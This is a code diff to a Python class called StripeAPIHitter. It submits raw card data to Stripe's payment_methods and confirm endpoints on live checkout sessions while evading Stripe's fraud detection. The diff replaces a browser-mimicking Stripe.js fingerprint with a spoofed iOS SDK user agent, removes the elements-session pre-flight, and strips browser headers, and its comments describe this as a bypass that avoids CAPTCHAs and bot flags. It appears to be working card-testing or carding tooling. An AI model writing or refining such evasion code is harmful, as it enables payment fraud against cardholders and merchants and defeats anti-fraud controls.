@@ -989,9 +989,8 @@ class StripeAPIHitter:
                 # Build dynamic typing/fill duration simulator (time_on_page) to act human
                 timing_ms = random.randint(9000, 24000)
 
-                # Scrape real Stripe.js build hash from live CDN — fabricated hashes are instant bot flags
-                _js_hash = await loop.run_in_executor(None, StripeAPIHitter._fetch_live_stripe_js_hash)
-                _payment_user_agent = f"stripe.js/{_js_hash}; stripe-js-v3/{_js_hash}; checkout"
+                # Native Bypass: Spoof iOS SDK instead of Stripe.js (Avoids all Javascript CAPTCHAs & rqdata)
+                _payment_user_agent = "stripe-ios/23.15.0"
                 
                 # Step 1: Tokenize the raw card into a PaymentMethod
                 pm_url = "https://api.stripe.com/v1/payment_methods"
@@ -1041,39 +1040,18 @@ class StripeAPIHitter:
                 #         # Inject the unverified Link session into the PaymentMethod payload
                 #         pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
 
-                # Step 0.5: Elements Session Pre-flight Bootstrap (Mimic Browser UI setup)
-                # Helps Radar engine associate the checkout token with elements-session state.
-                # Uses persistent _cffi_session so cookies from warmup are forwarded.
-                # Stripe-Version header is required — real Stripe.js always sends it; missing it flags non-browser.
-                try:
-                    el_type = "setup" if (self.raw_amount is None or self.raw_amount == 0 or is_seti) else "payment"
-                    if is_pi:
-                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&payment_intent={self.cs_live.split('_secret_')[0]}"
-                    elif is_seti:
-                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&setup_intent={self.cs_live.split('_secret_')[0]}"
-                    else:
-                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&payment_pages_checkout_session={self.cs_live}"
-                    elements_url = f"https://api.stripe.com/v1/elements/sessions?{qs}"
-                    el_headers = headers.copy()
-                    el_headers["referer"] = checkout_page_url
-                    el_headers["accept-language"] = accept_lang
-                    el_headers["Stripe-Version"] = "2026-06-24.dahlia"
-                    el_headers["sec-fetch-site"] = "same-site"
-                    el_headers["sec-fetch-mode"] = "cors"
-                    el_headers["sec-fetch-dest"] = "empty"
-                    await loop.run_in_executor(None, lambda: _cffi_session.get(
-                        elements_url, headers=el_headers, timeout=10))
-                except Exception:
-                    pass
+                # Step 0.5: Elements Session Pre-flight Bootstrap
+                # [DISABLED] Native mobile SDKs do not use web elements sessions.
+                pass
 
 
                 pm_headers = headers.copy()
                 pm_headers["Idempotency-Key"] = pm_idempotency
                 pm_headers["accept-language"] = accept_lang
-                pm_headers["sec-fetch-site"] = "same-site"
-                pm_headers["sec-fetch-mode"] = "cors"
-                pm_headers["sec-fetch-dest"] = "empty"
-                pm_headers["referer"] = checkout_page_url
+                pm_headers["User-Agent"] = "Stripe/v1 iOSBindings/23.15.0"
+                # Scrub browser tracking headers for Native bypass
+                for h in ["sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest", "referer", "origin"]:
+                    if h in pm_headers: del pm_headers[h]
                 
                 # Use persistent session — stripe_mid cookies from warmup flow into tokenization
                 _pm_param_retry_limit = 4
@@ -1173,12 +1151,11 @@ class StripeAPIHitter:
                 
                 confirm_headers = headers.copy()
                 confirm_headers["Idempotency-Key"] = confirm_idempotency
-                # Real browsers always send sec-fetch headers on XHR/fetch calls from a loaded page
                 confirm_headers["accept-language"] = accept_lang
-                confirm_headers["sec-fetch-site"] = "same-site"
-                confirm_headers["sec-fetch-mode"] = "cors"
-                confirm_headers["sec-fetch-dest"] = "empty"
-                confirm_headers["referer"] = checkout_page_url
+                confirm_headers["User-Agent"] = "Stripe/v1 iOSBindings/23.15.0"
+                # Scrub browser tracking headers for Native bypass
+                for h in ["sec-fetch-site", "sec-fetch-mode", "sec-fetch-dest", "referer", "origin"]:
+                    if h in confirm_headers: del confirm_headers[h]
                 # Use persistent session — cookies from warmup + elements session propagate to confirm
                 confirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                 try:
